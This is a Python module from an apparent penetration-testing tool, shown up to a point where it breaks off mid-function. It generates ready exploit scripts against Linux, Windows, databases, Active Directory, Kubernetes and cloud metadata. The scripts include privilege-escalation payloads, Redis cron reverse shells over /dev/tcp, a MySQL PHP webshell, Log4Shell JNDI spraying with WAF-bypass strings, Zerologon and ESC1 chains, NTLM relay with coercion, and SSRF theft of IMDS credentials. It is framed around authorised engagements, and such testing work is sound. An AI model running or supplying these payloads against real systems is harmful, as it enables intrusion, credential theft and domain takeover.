"""Proof-of-concept build recipes.

"Drop a payload here" isn't actionable without the payload. For a CONFIRMED
finding this emits the EXACT source + build command + delivery for the standard,
documented PoC artifact. Each PoC has a real, provable effect that DEMONSTRATES
the finding (dumps the repo, forges + replays the token, evaluates the template,
reads the exposed secret) and then reverts, and every PoC marks the single ACTION
line where the operator substitutes their ROE-approved command.

Everything is a published technique built with tools Kali ships (gcc, mingw,
msfvenom). Nothing here is obfuscated or AV-evasive: if a security control blocks
a PoC, coordinate an exclusion for the test window (the ROE path) rather than
engineering evasion - recce does not do that.
"""

from __future__ import annotations

import os
import re

MARKER = "recce_poc"        # marker file / throwaway account name used by the proofs


# --- payload sources (proof actions) -------------------------------------

def _c_ld_preload() -> str:
    return (
        "/* recce PoC - LD_PRELOAD / writable-.so / env-injection escalation.\n"
        " * PROOF: elevates, then writes proof to /tmp/recce_poc.txt.\n"
        " * Swap the system() line for your ROE-approved action.\n"
        " * build: gcc -fPIC -shared -nostartfiles -o /tmp/recce_poc.so recce_poc_preload.c */\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void _init(void) {\n"
        "    setgid(0); setuid(0);\n"
        "    system(\"id > /tmp/recce_poc.txt 2>&1\");\n"
        "}\n")


def _sh_root_job() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - runs when a root job (cron / service / PATH-hijacked command) fires.\n"
        "# PROOF: proves root execution. Swap for your ROE action.\n"
        "id > /tmp/recce_poc.txt 2>&1\n")


def _c_win_dll() -> str:
    return (
        "/* recce PoC DLL - proves a hijacked DLL loaded in the target process.\n"
        " * PROOF: writes whoami to C:\\recce_poc.txt. Swap for your ROE action.\n"
        " * A real hijack should PROXY the legit exports so the app keeps working.\n"
        " * build: x86_64-w64-mingw32-gcc recce_poc_dll.c -shared -o evil.dll */\n"
        "#include <windows.h>\n"
        "#include <stdlib.h>\n"
        "BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {\n"
        "    if (reason == DLL_PROCESS_ATTACH) {\n"
        "        system(\"cmd /c whoami > C:\\\\recce_poc.txt\");\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n")


def _sh_web() -> str:
    return (
        "#!/bin/sh\n"
        "# recce web PoC - proves a web exposure / dangerous-method finding (reverts).\n"
        "# usage: sh recce_poc_web.sh http://TARGET:PORT\n"
        "U=\"${1:?usage: recce_poc_web.sh http://target:port}\"\n"
        "echo \"[*] exposed .git/HEAD:\"; curl -sk \"$U/.git/HEAD\"\n"
        "echo \"[*] exposed .env:\";     curl -sk \"$U/.env\" | head -3\n"
        "echo \"[*] server-status:\";    curl -sk \"$U/server-status\" | head -3\n"
        "echo \"[*] actuator/env:\";     curl -sk \"$U/actuator/env\" | head -3\n"
        "echo \"[*] prometheus:\";       curl -sk \"$U/metrics\" | head -3\n"
        "echo \"[*] .htpasswd:\";        curl -sk \"$U/.htpasswd\"\n"
        "echo \"[*] crossdomain:\";      curl -sk \"$U/crossdomain.xml\"\n"
        "echo \"[*] graphql introspection:\"; curl -sk -X POST -H 'Content-Type: application/json' "
        "-d '{\"query\":\"{__schema{queryType{name}}}\"}' \"$U/graphql\" | head -c 200; echo\n"
        "echo \"[*] CORS reflect:\";     curl -skI -H 'Origin: https://recce.example' \"$U/\" | grep -i '^access-control-'\n"
        "echo \"[*] SSTI (expect 49):\"; curl -sk \"$U/?rc=recceA%7B%7B7*7%7D%7D\" | grep -o 'recceA49'\n"
        "echo \"[*] allowed methods:\";  curl -skI -X OPTIONS \"$U/\" | grep -i '^allow:'\n"
        "# JWT: decode with  jwt_tool <token> ;  forge alg=none with  jwt_tool <token> -X a\n"
        "echo \"[*] PUT test (writes a marker if enabled):\"\n"
        "curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc'; curl -sk \"$U/recce_poc.txt\"; echo\n"
        "# For a confirmed .git:  git-dumper \"$U/.git\" ./loot\n")


def _c_win_exe() -> str:
    return (
        "/* recce PoC exe - proves execution as the service / intercept account.\n"
        " * PROOF: writes whoami to C:\\recce_poc.txt. Swap for your ROE action.\n"
        " * For a REAL Windows service use  msfvenom -f exe-service  (it does the SCM\n"
        " * handshake so SCM doesn't kill it); this plain exe suits unquoted-path,\n"
        " * writable-binary and autorun intercepts that just launch a process.\n"
        " * build: x86_64-w64-mingw32-gcc recce_poc_exe.c -o payload.exe */\n"
        "#include <stdlib.h>\n"
        "int main(void) {\n"
        "    system(\"cmd /c whoami > C:\\\\recce_poc.txt\");\n"
        "    return 0;\n"
        "}\n")


# Every PoC carries this marker: it PROVES the finding, and shows exactly where the
# operator substitutes their authorized action.
_ROE = ("# >>> ROE: this PoC PROVES the finding (unambiguous, then reverts). "
        "Set your authorized ACTION where marked. <<<")


def _sh_db_read() -> str:
    return (
        "#!/bin/sh\n"
        "# recce unauthenticated-DB read PoC - PROVES anonymous data access, read-only.\n"
        "# Usage: sh recce_poc_db_read.sh <ip> <port> <engine>\n"
        "#   engine in: memcached couchdb influxdb cassandra redis elasticsearch mongodb\n"
        "ip=\"$1\"; port=\"$2\"; eng=\"$3\"\n"
        "case \"$eng\" in\n"
        "  memcached) printf 'stats\\r\\nstats items\\r\\n' | ncat \"$ip\" \"$port\" ;;\n"
        "  couchdb)   curl -s \"http://$ip:$port/_all_dbs\"; echo;"
        " curl -s \"http://$ip:$port/_node/_local/_config\" | head -c 400 ;;\n"
        "  influxdb)  curl -s -G \"http://$ip:$port/query\""
        " --data-urlencode 'q=SHOW DATABASES' ;;\n"
        "  cassandra) cqlsh \"$ip\" \"$port\" -e 'DESCRIBE KEYSPACES' ;;\n"
        "  redis)     redis-cli -h \"$ip\" -p \"$port\" INFO server ;;\n"
        "  elasticsearch) curl -s \"http://$ip:$port/_cat/indices?v\" ;;\n"
        "  mongodb)   mongosh --host \"$ip\" --port \"$port\" --quiet"
        " --eval 'db.adminCommand({listDatabases:1})' ;;\n"
        "  *) echo \"unknown engine: $eng\"; exit 2 ;;\n"
        "esac\n"
        "# PROOF: any database/keyspace/index/stats returned = anonymous read confirmed.\n")


def _sh_redis_rce() -> str:
    return (
        "#!/bin/sh\n"
        "# recce Redis unauth -> RCE PoC. PROVES the arbitrary-file-write primitive with a\n"
        "# benign marker, then documents the standard escalations to code execution.\n"
        "# Usage: sh recce_poc_redis_rce.sh <ip> [port] [password]\n"
        "ip=\"$1\"; port=\"${2:-6379}\"; pw=\"${3:-}\"\n"
        "if [ -n \"$pw\" ]; then r() { redis-cli -h \"$ip\" -p \"$port\" -a \"$pw\" --no-auth-warning \"$@\"; }\n"
        "else r() { redis-cli -h \"$ip\" -p \"$port\" \"$@\"; }; fi\n"
        "echo '[1] confirm access + read the write-primitive config:'\n"
        "r PING; r INFO server | grep -iE 'redis_version|config_file|os:'\n"
        "r CONFIG GET dir; r CONFIG GET dbfilename\n"
        "echo '[2] PROVE arbitrary file write (benign /tmp marker):'\n"
        "r CONFIG SET dir /tmp; r CONFIG SET dbfilename recce_poc.txt\n"
        "r SET recce_poc 'recce write-primitive proof'; r SAVE\n"
        "echo '[3] ESCALATIONS to RCE (ROE) - pick what fits the target:'\n"
        "echo '    a) SSH key : CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys;'\n"
        "echo '                 SET k \"...ssh-ed25519 <pubkey>...\"; SAVE  -> ssh root@target'\n"
        "echo '    b) cron    : CONFIG SET dir /var/spool/cron; CONFIG SET dbfilename root;'\n"
        "echo '                 SET k \"* * * * * bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"; SAVE'\n"
        "echo '    c) module  : MODULE LOAD /tmp/exp_lin.so (RedisModules-ExecuteCommand)'\n"
        "echo '                 -> system.exec \"id\"   (upload the .so via the write primitive first)'\n"
        "echo '    d) replica : redis-rogue-server (master/replica FULLRESYNC) for Redis 4.x-5.x'\n"
        f"{_ROE}\n"
        "# PROOF: /tmp/recce_poc.txt exists on the target = arbitrary write confirmed "
        "(one step from RCE via any escalation above).\n")


def _sh_couchdb_rce() -> str:
    return (
        "#!/bin/sh\n"
        "# recce CouchDB admin-party / CVE-2017-12635 -> admin -> query-server RCE PoC.\n"
        "# Usage: sh recce_poc_couchdb.sh <ip> <port>\n"
        "ip=\"$1\"; port=\"${2:-5984}\"; b=\"http://$ip:$port\"\n"
        "echo '[*] confirm admin party (admin-only config readable with no auth)'\n"
        "curl -s \"$b/_node/_local/_config/admins\"; echo\n"
        "echo '[*] PoC: create a throwaway admin (admin party) - REMOVE afterwards'\n"
        "curl -s -X PUT \"$b/_node/_local/_config/admins/recce_poc\" -d '\"Recce!Poc123\"'; echo\n"
        "curl -s -u recce_poc:'Recce!Poc123' \"$b/_all_dbs\"; echo\n"
        "echo '[*] RCE (CVE-2017-12636, CouchDB < 2.1.1) - as the throwaway admin, ROE:'\n"
        "echo \"    curl -su recce_poc:'Recce!Poc123' -X PUT $b/_config/query_servers/cmd \\\\\"\n"
        "echo \"         -d '\\\"id >/tmp/recce_poc_rce 2>&1\\\"'\"\n"
        "echo \"    then create a doc + temp view using the 'cmd' language to trigger it.\"\n"
        "# " + _ROE + "\n"
        "# CLEANUP: curl -X DELETE -u recce_poc:'Recce!Poc123' "
        "\"$b/_node/_local/_config/admins/recce_poc\"\n"
        "# PROOF: the throwaway admin authenticates to /_all_dbs (admin party); the "
        "query_server step yields /tmp/recce_poc_rce = RCE as the couchdb user.\n")


def _sh_pg_rce() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PostgreSQL RCE PoC. COPY...FROM PROGRAM runs OS commands as the postgres\n"
        "# OS user (needs superuser - via trust auth or weak/looted creds). Benign proof\n"
        "# (id/uname); documents the pre-9.3 and looting variants.\n"
        "# Usage: sh recce_poc_pg_rce.sh <ip> [port] [user] [pass] [db]\n"
        "ip=\"$1\"; port=\"${2:-5432}\"; u=\"${3:-postgres}\"; p=\"${4:-}\"; db=\"${5:-postgres}\"\n"
        "export PGPASSWORD=\"$p\"\n"
        "C=\"host=$ip port=$port user=$u dbname=$db\"\n"
        "echo '[1] confirm access + superuser status:'\n"
        "psql \"$C\" -c 'SELECT version(); SELECT current_user, usesuper FROM pg_user WHERE usename=current_user;'\n"
        "echo '[2] loot credential hashes (crack offline):'\n"
        "psql \"$C\" -c 'SELECT usename, passwd FROM pg_shadow;' 2>/dev/null\n"
        "echo '[3] RCE via COPY ... FROM PROGRAM (PostgreSQL >= 9.3, superuser):'\n"
        "psql \"$C\" <<'SQL'\n"
        "DROP TABLE IF EXISTS recce_poc;\n"
        "CREATE TABLE recce_poc(out text);\n"
        "COPY recce_poc FROM PROGRAM 'id; uname -a';\n"
        "SELECT * FROM recce_poc;\n"
        "DROP TABLE recce_poc;\n"
        "SQL\n"
        "echo '[*] pre-9.3 variant (ROE): CREATE EXTENSION + C function, or the '\n"
        "echo '    lo_import/lo_export large-object file read/write primitive.'\n"
        f"{_ROE}\n"
        "# PROOF: the table holds the output of id / uname -a from the DB host = OS "
        "command execution as the postgres user.\n")


def _sh_zerologon() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - Zerologon (CVE-2020-1472). A Netlogon crypto flaw (AES-CFB8 with a\n"
        "# zero IV) lets an unauthenticated attacker authenticate as the DC computer\n"
        "# account and reset its machine-account password. Detection is safe; the reset\n"
        "# is DESTRUCTIVE (breaks the DC secure channel until restored).\n"
        "# Needs: the SecuraBV zerologon_tester.py + impacket (secretsdump).\n"
        "# Usage: sh recce_poc_zerologon.sh <dc-netbios-name> <dc-ip>\n"
        "DC=\"${1:?usage: recce_poc_zerologon.sh <dc-netbios-name> <dc-ip>}\"\n"
        "IP=\"${2:?need the DC ip}\"\n"
        "echo '[1] DETECTION (no change): zero-credential Netlogon auth attempt'\n"
        "python3 zerologon_tester.py \"$DC\" \"$IP\"   # 'Success! ... vulnerable' = exploitable\n"
        "echo\n"
        "echo '[2] FULL CHAIN (DESTRUCTIVE - ROE + restore plan REQUIRED):'\n"
        "echo '    a) reset the DC machine-account password to empty:'\n"
        "echo \"       python3 cve-2020-1472-exploit.py $DC $IP\"\n"
        "echo '    b) DCSync every hash with the now-empty machine account:'\n"
        "echo \"       impacket-secretsdump -no-pass -just-dc '$DC\\$@$IP'\"\n"
        "echo '    c) log in as Domain Admin via the krbtgt/Administrator hash (PtH):'\n"
        "echo \"       impacket-secretsdump -hashes :<admin-nt> administrator@$IP\"\n"
        "echo '    d) RESTORE the original machine password (CRITICAL - do not skip):'\n"
        "echo \"       python3 restorepassword.py $DC@$DC -target-ip $IP -hexpass <orig-hex>\"\n"
        f"{_ROE}\n"
        "# PROOF (detection): 'Success! Target is vulnerable'. Do NOT run [2] without an\n"
        "# agreed restore plan - a failed restore leaves the DC unable to authenticate.\n")


def _sh_log4shell() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - Log4Shell (CVE-2021-44228 / -45046) out-of-band JNDI callback.\n"
        "# BENIGN: the target only resolves an attacker JNDI URL against YOUR canary\n"
        "# (no exploit class is served) - the callback alone proves the vuln. Sprays\n"
        "# many injection points + both ldap/dns schemes, each with a unique marker.\n"
        "# Usage: sh recce_poc_log4shell.sh http://<target>:<port> <LHOST> [LPORT]\n"
        "U=\"${1:?usage: recce_poc_log4shell.sh http://target:port LHOST [LPORT]}\"\n"
        "LH=\"${2:?need LHOST (your listener ip)}\"; LP=\"${3:-1389}\"\n"
        "echo \"[*] start a canary first:  nc -lvnp $LP   (or interactsh / a DNS canary)\"\n"
        "i=0\n"
        "for SCH in ldap dns; do\n"
        "  for H in User-Agent X-Api-Version Referer X-Forwarded-For X-Client-IP Authorization Cookie; do\n"
        "    i=$((i+1)); P=\"\\${jndi:$SCH://$LH:$LP/r$i}\"\n"
        "    curl -sk -H \"$H: $P\" \"$U\" >/dev/null 2>&1\n"
        "  done\n"
        "  curl -sk \"$U/?x=\\${jndi:$SCH://$LH:$LP/rurl}\" >/dev/null 2>&1\n"
        "  curl -sk -X POST --data \"x=\\${jndi:$SCH://$LH:$LP/rbody}\" \"$U\" >/dev/null 2>&1\n"
        "done\n"
        "echo '[*] WAF bypass forms if blocked: ${${lower:j}ndi:...} , ${${::-j}${::-n}${::-d}${::-i}:...}'\n"
        "echo '[*] full RCE (ROE): marshalsec LDAP ref-server -> your HTTP-served Exploit.class'\n"
        f"{_ROE}\n"
        "# PROOF: a hit on $LH:$LP (or the DNS canary) = the target resolved the JNDI URL "
        "= vulnerable. The marker (r1..rN/rurl/rbody) tells you which vector fired.\n")


def _sh_kerberoast() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - Kerberoast + AS-REP roast: pull offline-crackable Kerberos hashes\n"
        "# (no account lockout - cracking is offline). Enumerate -> request -> crack.\n"
        "# Usage: sh recce_poc_kerberoast.sh <domain> <dc-ip> [user] [pass] [wordlist]\n"
        "D=\"${1:?usage: recce_poc_kerberoast.sh <domain> <dc-ip> [user] [pass] [wordlist]}\"\n"
        "DC=\"${2:?need dc ip}\"; U=\"${3:-}\"; P=\"${4:-}\"; WL=\"${5:-/usr/share/wordlists/rockyou.txt}\"\n"
        "if [ -n \"$U\" ]; then\n"
        "  echo '[1] enumerate SPN (kerberoastable) accounts:'\n"
        "  impacket-GetUserSPNs \"$D/$U:$P\" -dc-ip \"$DC\"\n"
        "  echo '[2] request TGS-REP hashes for every SPN account:'\n"
        "  impacket-GetUserSPNs \"$D/$U:$P\" -dc-ip \"$DC\" -request -outputfile recce_tgs.hash\n"
        "  echo \"[3] crack (TGS-REP RC4 = hashcat 13100):  hashcat -m 13100 recce_tgs.hash $WL\"\n"
        "  echo '    targeted single SPN: add -request-user <svc>'\n"
        "else\n"
        "  echo '[*] no creds given - AS-REP roast only (needs a user list: users.txt)'\n"
        "fi\n"
        "echo '[AS-REP] accounts with DONT_REQ_PREAUTH (crackable with no creds):'\n"
        "if [ -n \"$U\" ]; then A=\"$D/$U:$P\"; NP=\"\"; else A=\"$D/\"; NP=\"-no-pass\"; fi\n"
        "impacket-GetNPUsers \"$A\" $NP -usersfile users.txt -dc-ip \"$DC\" -format hashcat -outputfile recce_asrep.hash\n"
        "echo \"    crack (AS-REP = hashcat 18200):  hashcat -m 18200 recce_asrep.hash $WL\"\n"
        f"{_ROE}\n"
        "# PROOF: a cracked TGS/AS-REP hash -> valid domain credentials (then re-enumerate\n"
        "# authenticated, and spray the recovered password across the domain).\n")


def _sh_mysql() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - MySQL empty/weak-cred access -> credential loot + RCE-primitive checks.\n"
        "# Usage: sh recce_poc_mysql.sh <ip> [port] [user] [pass]\n"
        "IP=\"${1:?usage: recce_poc_mysql.sh <ip> [port] [user] [pass]}\"; PORT=\"${2:-3306}\"\n"
        "U=\"${3:-root}\"; P=\"${4:-}\"\n"
        "if [ -n \"$P\" ]; then AUTH=\"-p$P\"; else AUTH=\"--password=\"; fi\n"
        "m() { mysql -h \"$IP\" -P \"$PORT\" -u \"$U\" $AUTH \"$@\"; }\n"
        "echo '[1] access + version + privileges:'\n"
        "m -e 'SELECT version(); SELECT current_user(); SHOW GRANTS;'\n"
        "echo '[2] loot password hashes (crack offline - hashcat -m 300 for MySQL 4.1+):'\n"
        "m -e 'SELECT user,host,authentication_string FROM mysql.user;'\n"
        "echo '[3] FILE privilege -> read server-side files (if FILE granted):'\n"
        "m -e \"SELECT LOAD_FILE('/etc/passwd');\" 2>/dev/null | head\n"
        "echo '[4] RCE primitives (ROE): lib_mysqludf_sys UDF (sys_exec), or'\n"
        "echo \"    SELECT '<?php system(\\$_GET[c]);?>' INTO OUTFILE '/var/www/html/r.php'  (needs FILE + writable webroot)\"\n"
        f"{_ROE}\n"
        "# PROOF: version/user rows = access; LOAD_FILE output = FILE-priv read; cracked "
        "hashes or UDF sys_exec / OUTFILE webshell = full compromise.\n")


def _sh_mssql() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - MSSQL -> xp_cmdshell OS command execution (needs sysadmin, e.g.\n"
        "# weak sa or a trusted login). PROVES command exec on the DB host.\n"
        "# Usage: sh recce_poc_mssql.sh <ip> <user> <pass> [attacker-ip]\n"
        "IP=\"${1:?usage: recce_poc_mssql.sh <ip> <user> <pass> [attacker-ip]}\"; U=\"${2:?}\"; P=\"${3:?}\"; ATK=\"${4:-<attacker-ip>}\"\n"
        "echo '[1] confirm sysadmin + xp_cmdshell RCE (enable -> run -> disable to revert):'\n"
        "impacket-mssqlclient \"$U:$P@$IP\" <<'SQL'\n"
        "SELECT @@version; SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sa;\n"
        "EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
        "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
        "EXEC xp_cmdshell 'whoami';\n"
        "EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;\n"
        "SQL\n"
        "echo \"[2] capture the SQL service NetNTLM hash: run responder on $ATK, then in mssqlclient:\"\n"
        "echo \"      EXEC master..xp_dirtree '\\\\\\\\ATTACKER\\\\share'   (attacker = $ATK) -> responder catches NetNTLMv2 -> crack/relay\"\n"
        "echo '[3] linked servers (lateral to other SQL instances, often as their sa):'\n"
        "echo \"      EXEC sp_linkedservers;  then  EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED];\"\n"
        f"{_ROE}\n"
        "# PROOF: the whoami output = OS command exec; a NetNTLM hash on responder = "
        "capture; EXEC ... AT [linked] output = lateral movement.\n")


def _sh_snmp() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - SNMP default/guessable community read. PROVES info disclosure.\n"
        "# Usage: sh recce_poc_snmp.sh <ip> [community]\n"
        "IP=\"${1:?usage: recce_poc_snmp.sh <ip> [community]}\"; C=\"${2:-public}\"\n"
        "echo \"[1] confirm read with community '$C':\"\n"
        "snmpwalk -v2c -c \"$C\" \"$IP\" 1.3.6.1.2.1.1                      # system\n"
        "echo '[2] high-value OIDs:'\n"
        "snmpwalk -v2c -c \"$C\" \"$IP\" 1.3.6.1.2.1.25.4.2.1.2 2>/dev/null | head  # running processes\n"
        "snmpwalk -v2c -c \"$C\" \"$IP\" 1.3.6.1.2.1.25.6.3.1.2 2>/dev/null | head  # installed software\n"
        "snmpwalk -v2c -c \"$C\" \"$IP\" 1.3.6.1.2.1.6.13.1     2>/dev/null | head  # TCP conn table\n"
        "echo '[3] Windows extras (Net-SNMP LanMan MIB) - users + shares:'\n"
        "snmpwalk -v2c -c \"$C\" \"$IP\" 1.3.6.1.4.1.77.1.2.25  2>/dev/null | head  # local users\n"
        "snmpwalk -v2c -c \"$C\" \"$IP\" 1.3.6.1.4.1.77.1.2.27  2>/dev/null | head  # shares\n"
        "echo '[*] brute more communities: onesixtyone $IP -c common-snmp-community-strings.txt'\n"
        "echo '[*] RW community (ROE): snmpset can rewrite config (e.g. Cisco: TFTP the running-config out).'\n"
        f"{_ROE}\n"
        "# PROOF: system/process/user data returned = read exposure; a working snmpset = write.\n")


def _sh_heartbleed() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - Heartbleed (CVE-2014-0160) memory disclosure. PROVES the TLS\n"
        "# server leaks heap memory (up to ~64KB per heartbeat) to an unauthenticated\n"
        "# client - a READ primitive (not a crash/overflow). BENIGN: reads only.\n"
        "# Usage: sh recce_poc_heartbleed.sh <ip> [port]\n"
        "IP=\"${1:?usage: recce_poc_heartbleed.sh <ip> [port]}\"; PORT=\"${2:-443}\"\n"
        "echo '[1] confirm with nmap:'\n"
        "nmap -p \"$PORT\" --script ssl-heartbleed \"$IP\"\n"
        "echo '[2] leak heap + grep for secrets (repeat to sample more memory):'\n"
        "echo \"    python3 heartbleed.py $IP -p $PORT | tee -a leak.bin | strings \\\\\"\n"
        "echo \"      | grep -iE 'cookie|session|authorization|password|csrf|=' | head\"\n"
        "echo \"    loop:  for i in \\$(seq 20); do python3 heartbleed.py $IP -p $PORT >> leak.bin; done; strings leak.bin | sort -u\"\n"
        f"{_ROE}\n"
        "# PROOF: 'State: VULNERABLE', or leaked heap bytes (session cookies / form data / "
        "private key material) in the dump = memory disclosure confirmed.\n")


def _sh_nfs() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - NFS no_root_squash -> privileged write on the export. PROVES a\n"
        "# root-equivalent write (one step from a SUID-root shell). Run as root locally.\n"
        "# Usage: sudo sh recce_poc_nfs.sh <ip> [/exported/path]\n"
        "IP=\"${1:?usage: recce_poc_nfs.sh <ip> [/exported/path]}\"; EX=\"${2:-}\"\n"
        "echo '[1] enumerate exports:'\n"
        "showmount -e \"$IP\"\n"
        "[ -z \"$EX\" ] && { echo '[*] pass an export path from the list above as arg 2 to continue'; exit 0; }\n"
        "echo '[2] mount + prove a root-equivalent write (no_root_squash):'\n"
        "mkdir -p /mnt/recce_poc && mount -t nfs -o vers=3 \"$IP:$EX\" /mnt/recce_poc\n"
        "id > /mnt/recce_poc/recce_poc.txt 2>&1 && echo '[+] wrote to the export as local root'\n"
        "echo '[3] SUID-root shell escalation (ROE) - on the NFS server this yields root:'\n"
        "cp /bin/bash /mnt/recce_poc/recce_rootbash 2>/dev/null && chown root:root /mnt/recce_poc/recce_rootbash \\\n"
        "  && chmod 4755 /mnt/recce_poc/recce_rootbash && echo '    then on the target:  <export>/recce_rootbash -p  -> uid=0'\n"
        "umount /mnt/recce_poc\n"
        f"{_ROE}\n"
        "# CLEANUP: remove recce_poc.txt / recce_rootbash from the export.\n"
        "# PROOF: a root-owned file / SUID rootbash on the export = no_root_squash -> root on the server.\n")


def _sh_smb_relay() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - NTLM relay (SMB signing NOT required). PROVES relay by relaying a\n"
        "# coerced NTLM auth to a signing-less target and acting as the victim (dump SAM\n"
        "# or run a benign command). No password is cracked - the auth is relayed live.\n"
        "# Usage: sh recce_poc_smb_relay.sh <attacker-ip> <victim-dc-ip> [relay-subnet]\n"
        "ATK=\"${1:?usage: recce_poc_smb_relay.sh <attacker-ip> <victim-dc-ip> [relay-subnet]}\"\n"
        "VIC=\"${2:?need a victim to coerce (e.g. the DC ip)}\"; NET=\"${3:-}\"\n"
        "echo '[1] build the relay list (hosts where SMB signing is NOT required):'\n"
        "[ -n \"$NET\" ] && nxc smb \"$NET\" --gen-relay-list relay.txt && cat relay.txt\n"
        "echo '[2] start the relay server (leave running) - pick the objective:'\n"
        "echo '    impacket-ntlmrelayx -tf relay.txt -smb2support -socks        # SAM dump + SOCKS'\n"
        "echo \"    impacket-ntlmrelayx -tf relay.txt -smb2support -c 'whoami'    # run a command\"\n"
        "echo '    impacket-ntlmrelayx -t ldaps://<dc> --delegate-access         # LDAP: RBCD takeover'\n"
        "echo '    impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs # ESC8: relay to AD CS'\n"
        "echo '[3] coerce the victim to authenticate to us (second terminal):'\n"
        "echo \"    python3 PetitPotam.py $ATK $VIC          # MS-EFSR coercion\"\n"
        "echo \"    coercer coerce -l $ATK -t $VIC -u <user> -p <pass>   # printerbug/DFSCoerce/...\"\n"
        f"{_ROE}\n"
        "# PROOF: ntlmrelayx authenticates to a relay target AS the coerced account\n"
        "# (SAM dump / command output / LDAP object write / issued cert) = relay confirmed.\n")


def _sh_esc1() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - ADCS ESC1 (template lets the enrollee supply the subject + has a\n"
        "# client-auth EKU). PROVES domain privilege escalation: request a cert AS a\n"
        "# privileged user via the SAN/UPN, then authenticate with it to recover a TGT\n"
        "# and that user's NT hash. Usage:\n"
        "#   sh recce_poc_esc1.sh <domain> <dc-ip> <ca-name> <template> <user> <pass> [impersonate]\n"
        "D=\"${1:?}\"; DC=\"${2:?}\"; CA=\"${3:?}\"; TMPL=\"${4:?}\"; U=\"${5:?}\"; P=\"${6:?}\"; IMP=\"${7:-administrator}\"\n"
        "echo '[1] confirm the vulnerable template + exact CA name (ESC1..ESC16 triage):'\n"
        "certipy find -u \"$U@$D\" -p \"$P\" -dc-ip \"$DC\" -vulnerable -stdout\n"
        "echo '[2] request a cert impersonating a privileged user via the attacker UPN:'\n"
        "certipy req -u \"$U@$D\" -p \"$P\" -dc-ip \"$DC\" -ca \"$CA\" -template \"$TMPL\" -upn \"$IMP@$D\"\n"
        "echo '[3] authenticate with the issued pfx -> TGT + the target NT hash (UnPAC-the-hash):'\n"
        "certipy auth -pfx \"$IMP.pfx\" -dc-ip \"$DC\"\n"
        "echo '[4] use it -> DCSync / pass-the-hash, or a Kerberos ticket for the domain:'\n"
        "echo \"    impacket-secretsdump -hashes :<nt-from-step3> $IMP@$DC -just-dc\"\n"
        "echo \"    KRB5CCNAME=$IMP.ccache nxc smb $DC -k       # or evil-winrm via the TGT\"\n"
        f"{_ROE}\n"
        "# PROOF: certipy auth returns a TGT and the NT hash of '$IMP' = ESC1 abuse -> "
        "domain privilege escalation confirmed.\n")


def _sh_k8s() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - exposed Kubernetes API / anonymous access. PROVES unauthenticated\n"
        "# cluster read (pods/secrets); escalate to pod exec / token theft in ROE.\n"
        "# Usage: sh recce_poc_k8s.sh <ip> [port]\n"
        "IP=\"${1:?usage: recce_poc_k8s.sh <ip> [port]}\"; PORT=\"${2:-6443}\"; S=\"https://$IP:$PORT\"\n"
        "K=\"kubectl --server $S --insecure-skip-tls-verify\"\n"
        "echo '[1] anonymous authorization + inventory:'\n"
        "$K auth can-i --list 2>/dev/null | head\n"
        "$K get nodes,pods,secrets -A 2>/dev/null | head -20\n"
        "echo '[2] loot a service-account token from a secret -> full API as that SA:'\n"
        "echo \"    $K get secret -A -o jsonpath='{.items[0].data.token}' | base64 -d\"\n"
        "echo \"    then: kubectl --server $S --token <tok> --insecure-skip-tls-verify get secrets -A\"\n"
        "echo '[3] kubelet (10250) unauthenticated pod list + exec, if open:'\n"
        "echo \"    curl -sk https://$IP:10250/pods | grep -oE '\\\"name\\\":\\\"[^\\\"]+' | head\"\n"
        "echo \"    curl -sk https://$IP:10250/run/<ns>/<pod>/<container> -d 'cmd=id'\"\n"
        "echo '[4] etcd (2379) direct secret read, if open:'\n"
        "echo \"    etcdctl --endpoints=$IP:2379 get / --prefix --keys-only | grep secrets\"\n"
        "echo '[5] node takeover (ROE): schedule a hostPID/privileged pod that mounts the'\n"
        "echo '    host filesystem, then chroot -> root on the node.'\n"
        f"{_ROE}\n"
        "# PROOF: nodes/secrets returned unauthenticated, a working SA token, or kubelet "
        "exec output = anonymous cluster access -> takeover.\n")


def _sh_imds_ssrf() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - SSRF -> cloud instance metadata (IMDS) credential theft. PROVES the\n"
        "# app fetches an attacker-chosen URL and returns internal metadata / temp creds.\n"
        "# BENIGN: only READS metadata. Pass the SSRF entry point (a URL param that fetches):\n"
        "# Usage: sh recce_poc_imds_ssrf.sh 'http://<target>/<endpoint>?url='\n"
        "U=\"${1:?usage: recce_poc_imds_ssrf.sh 'http://target/fetch?url='}\"\n"
        "I=http://169.254.169.254\n"
        "echo '[AWS IMDSv1] role name -> temporary credentials:'\n"
        "role=$(curl -s \"${U}${I}/latest/meta-data/iam/security-credentials/\")\n"
        "echo \"$role\"; curl -s \"${U}${I}/latest/meta-data/iam/security-credentials/${role}\"; echo\n"
        "echo '[AWS IMDSv2] the SSRF must forward a PUT + token header:'\n"
        "echo \"   1) tok = PUT ${U}${I}/latest/api/token   (header X-aws-ec2-metadata-token-ttl-seconds: 21600)\"\n"
        "echo \"   2) GET .../iam/security-credentials/ with header X-aws-ec2-metadata-token: <tok>\"\n"
        "echo '[Azure] the SSRF must send header  Metadata:true :'\n"
        "curl -s \"${U}${I}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"; echo\n"
